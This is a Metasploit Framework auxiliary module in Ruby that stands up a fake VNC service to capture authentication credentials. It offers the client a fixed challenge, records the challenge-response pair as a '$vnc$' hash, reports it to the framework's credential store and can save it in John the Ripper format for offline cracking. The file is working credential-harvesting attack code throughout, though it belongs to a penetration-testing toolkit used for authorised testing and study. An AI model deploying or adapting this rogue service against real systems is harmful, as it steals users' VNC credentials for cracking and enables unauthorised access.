##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::TcpServer
  include Msf::Auxiliary::Report

  def initialize
    super(
      'Name'           => 'Authentication Capture: VNC',
      'Description'    => %q{
        This module provides a fake VNC service that
      is designed to capture authentication credentials.
      },
      'Author'         => 'Patrik Karlsson <patrik[at]cqure.net>',
      'License'        => MSF_LICENSE,
      'Actions'        => [ [ 'Capture' ] ],
      'PassiveActions' => [ 'Capture' ],
      'DefaultAction'  => 'Capture'
    )

    register_options(
      [
        OptPort.new('SRVPORT', [ true, "The local port to listen on.", 5900 ]),
        OptString.new('CHALLENGE', [ true, "The 16 byte challenge", "00112233445566778899AABBCCDDEEFF" ]),
        OptString.new('JOHNPWFILE',  [ false, "The prefix to the local filename to store the hashes in JOHN format", nil ])
      ], self.class)
  end

  def setup
    super
    @state = {}
  end

  def run
    if datastore['CHALLENGE'].to_s =~ /^([a-fA-F0-9]{32})$/
      @challenge = [ datastore['CHALLENGE'] ].pack("H*")
    else
      print_error("CHALLENGE syntax must match 00112233445566778899AABBCCDDEEFF")
      return
    end
    print_status("Listening on #{datastore['SRVHOST']}:#{datastore['SRVPORT']}...")
    exploit()
  end

  def on_client_connect(c)
    @state[c] = {
      :name    => "#{c.peerhost}:#{c.peerport}",
      :ip      => c.peerhost,
      :port    => c.peerport,
      :pass    => nil,
      :chall   => nil,
      :proto   => nil
    }

    c.put "RFB 003.007\n"
  end

  def on_client_data(c)
    data = c.get_once
    return if not data

    peer = "#{c.peerhost}:#{c.peerport}"

    if data =~ /^RFB (.*)\n$/
      @state[c][:proto] = $1
      if @state[c][:proto] == "003.007"
        # for the 003.007 protocol we say we support the VNC sectype
        # and wait for the server to acknowledge it, before we send the
        # challenge.
        c.put [0x0102].pack("n") # 1 sectype, unencrypted
      elsif @state[c][:proto] == "003.003"
        # for the 003.003 protocol we say we support the VNC sectype
        # and immediately send the challenge
        sectype = [0x00000002].pack("N")
        c.put sectype

        @state[c][:chall] = @challenge
        c.put @state[c][:chall]
      else
        c.close
      end
    # the challenge was sent, so this should be our response
    elsif @state[c][:chall]
      c.put [0x00000001].pack("N")
      c.close
      print_status("#{peer} - Challenge: #{@challenge.unpack('H*')[0]}; Response: #{data.unpack('H*')[0]}")
      hash_line = "$vnc$*#{@state[c][:chall].unpack("H*")[0]}*#{data.unpack('H*')[0]}"
      report_auth_info(
        :host  => c.peerhost,
        :port => datastore['SRVPORT'],
        :sname => 'vnc_client',
        :user => "",
        :pass => hash_line,
        :type => "vnc_hash",
        :proof => hash_line,
        :source_type => "captured",
        :active => true
      )

      if(datastore['JOHNPWFILE'])
        fd = ::File.open(datastore['JOHNPWFILE'] + '_vnc' , "ab")
        fd.puts hash_line
        fd.close
      end
    # we have got the protocol sorted out and have offered the VNC sectype (2)
    elsif @state[c][:proto] == "003.007"
      if ( data.unpack("C")[0] != 2 )
        print_error("#{peer} - sectype not offered! #{data.unpack("H*")}")
        c.close
        return
      end
      @state[c][:chall] = @challenge
      c.put @state[c][:chall]
    end
  end

  def on_client_close(c)
    @state.delete(c)
  end
end
